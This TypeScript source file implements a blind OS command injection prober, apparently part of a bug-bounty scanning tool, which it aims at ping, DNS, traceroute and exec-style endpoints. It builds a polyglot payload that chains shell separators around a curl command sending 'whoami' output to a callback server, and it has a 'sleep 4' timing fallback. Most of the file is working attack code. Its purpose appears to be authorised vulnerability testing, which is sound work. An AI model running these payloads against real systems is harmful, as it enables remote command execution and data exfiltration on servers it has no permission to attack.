/**
 * Blind OS command injection detection — the most common real-world RCE bug
 * class in bounty programs, and previously the biggest gap in RCE coverage:
 * the generic "rce" vulnClass only ever reached nuclei's public CVE
 * templates (signature matching against known products), with no active
 * probe that actually tries to inject shell metacharacters into
 * network-utility-style parameters (ip/host/domain/target — ping, DNS
 * lookup, traceroute endpoints are classic sinks for `sh -c("cmd " + input)`
 * string concatenation bugs).
 *
 * Primary tier is OOB-confirmed exactly like blind-xxe-probe.ts and
 * deserialization-prober.ts: a single polyglot payload chains multiple
 * shell-separator syntaxes (`;`, backticks, `$()`) around one curl command
 * pointed at our callback server, so any separator the target's shell
 * context accepts fires the beacon — and the command run is `whoami`,
 * exfiltrated via the callback's query string (callbackServer's existing
 * `exfil` field), so a hit isn't just "injection occurred" but real,
 * attacker-controlled command *output* landing on our server — the same
 * "unforgeable evidence" bar as every other self-confirmed prober.
 *
 * Fallback tier is time-based blind injection (`sleep 4`) for targets whose
 * egress is filtered — weaker evidence (latency deltas can have other
 * causes), so it's flagged medium/unconfirmed rather than critical.
 */
import { scopedHttp } from "../net/scoped-http";
import logger from "../../utils/logger";
import { callbackServer } from "../oob/callback-server";

interface CmdInjectionVuln {
  endpoint: string;
  param: string;
  method: "get" | "post_json";
  technique: "oob_command_exec" | "timing_blind";
  beaconId?: string;
  oobReceived: boolean;
  commandOutput?: string;
  severity: "critical" | "medium";
  detail: string;
}

interface CmdInjectionProbeResult {
  targetsTested: number;
  vulns: CmdInjectionVuln[];
  hypotheses: Array<{ vulnClass: string; reasoning: string; confidence: number; priority: number; endpoint: string; raw: CmdInjectionVuln }>;
}

interface InjectionTarget { path: string; param: string; method: "get" | "post_json"; }

// Network-utility-style endpoints are classic OS command injection sinks
// (`ping`/`nslookup`/`traceroute` wrapped in a shell string concat), plus a
// few generic "exec"-named API routes.
const TARGETS: InjectionTarget[] = [
  { path: "/ping", param: "ip", method: "get" },
  { path: "/api/ping", param: "ip", method: "get" },
  { path: "/api/ping", param: "host", method: "post_json" },
  { path: "/dns", param: "domain", method: "get" },
  { path: "/api/dns-lookup", param: "domain", method: "get" },
  { path: "/lookup", param: "host", method: "get" },
  { path: "/api/lookup", param: "target", method: "get" },
  { path: "/diagnostic", param: "address", method: "get" },
  { path: "/api/diagnostic", param: "ip", method: "post_json" },
  { path: "/traceroute", param: "host", method: "get" },
  { path: "/api/traceroute", param: "target", method: "get" },
  { path: "/exec", param: "cmd", method: "post_json" },
  { path: "/api/exec", param: "command", method: "post_json" },
  { path: "/run", param: "cmd", method: "post_json" },
  { path: "/api/run", param: "command", method: "post_json" },
];

// Keep the base argument a valid-looking value (127.0.0.1) rather than
// garbage: a sink like `ping -c 1 <input>` given an invalid target (e.g.
// "1") can itself hang for 10+ seconds resolving/failing *before* the
// injected separator commands ever run, which starves our own request
// timeout and makes the injection look inert even when it works. A real,
// fast-succeeding base value isolates the injected commands' timing.
function buildPolyglotPayload(callbackUrl: string): string {
  const cmd = `curl -s "${callbackUrl}?u=$(whoami)"`;
  return `127.0.0.1;${cmd};\`${cmd}\`;$(${cmd})`;
}

class BlindCommandInjectionProber {
  async probe(targetUrl: string, authHeaders?: Record<string, string>, programId?: number): Promise<CmdInjectionProbeResult> {
    const base = targetUrl.replace(/\/$/, "");
    const vulns: CmdInjectionVuln[] = [];
    const headers = { ...(authHeaders ?? {}) };

    for (const t of TARGETS) {
      const vuln = await this.tryTarget(base, t, headers, programId);
      if (vuln) vulns.push(vuln);
    }

    const hypotheses = vulns.map(v => ({
      vulnClass: "rce",
      reasoning: v.detail,
      confidence: v.oobReceived ? 0.95 : 0.55,
      priority: v.oobReceived ? 10 : 7,
      endpoint: v.endpoint,
      raw: v,
    }));

    return { targetsTested: TARGETS.length, vulns, hypotheses };
  }

  private async send(url: string, t: InjectionTarget, value: string, headers: Record<string, string>, programId?: number) {
    if (t.method === "get") {
      return scopedHttp.get(url, { params: { [t.param]: value }, headers, timeout: 10000, validateStatus: () => true }, programId);
    }
    return scopedHttp.post(url, { [t.param]: value }, {
      headers: { "Content-Type": "application/json", ...headers },
      timeout: 10000,
      validateStatus: () => true,
    }, programId);
  }

  private async tryTarget(base: string, t: InjectionTarget, headers: Record<string, string>, programId?: number): Promise<CmdInjectionVuln | null> {
    const url = `${base}${t.path}`;
    const { beaconId, callbackUrl } = callbackServer.generateBeacon();
    try {
      const payload = buildPolyglotPayload(callbackUrl);
      await this.send(url, t, payload, headers, programId);
      const hit = await callbackServer.waitForHit(beaconId, 7000);
      if (hit) {
        const who = hit.exfil?.u;
        const detail = `Injected a polyglot command-separator payload into ${t.method === "get" ? "query" : "JSON body"} parameter "${t.param}" at ${url} and received a real OOB callback (beacon: ${beaconId})${who ? `, exfiltrating live command output: whoami=${who}` : ""} — confirmed blind OS command injection.`;
        logger.warn("[blind-command-injection-prober] command injection confirmed (OOB)", { url, param: t.param, beaconId, who });
        return { endpoint: url, param: t.param, method: t.method, technique: "oob_command_exec", beaconId, oobReceived: true, commandOutput: who, severity: "critical", detail };
      }
    } catch (err) {
      logger.debug(`[blind-command-injection-prober] OOB attempt error at ${url} (${t.param}): ${err}`);
    } finally {
      callbackServer.cleanup(beaconId);
    }

    return this.tryTiming(url, t, headers, programId);
  }

  private async tryTiming(url: string, t: InjectionTarget, headers: Record<string, string>, programId?: number): Promise<CmdInjectionVuln | null> {
    try {
      const t0 = Date.now();
      await this.send(url, t, "127.0.0.1", headers, programId);
      const baseline = Date.now() - t0;

      const t1 = Date.now();
      await this.send(url, t, "127.0.0.1;sleep 4;", headers, programId);
      const delayed = Date.now() - t1;

      const delta = delayed - baseline;
      if (delta > 3000) {
        const detail = `Injecting "sleep 4" via parameter "${t.param}" at ${url} added ${delta}ms of latency versus a benign baseline request — consistent with blind time-based OS command injection. No OOB egress was observed, so this is a timing signal, not confirmed command execution.`;
        logger.debug("[blind-command-injection-prober] timing-based injection signal", { url, param: t.param, delta });
        return { endpoint: url, param: t.param, method: t.method, technique: "timing_blind", oobReceived: false, severity: "medium", detail };
      }
    } catch (err) {
      logger.debug(`[blind-command-injection-prober] timing attempt error at ${url} (${t.param}): ${err}`);
    }
    return null;
  }
}

export const blindCommandInjectionProber = new BlindCommandInjectionProber();
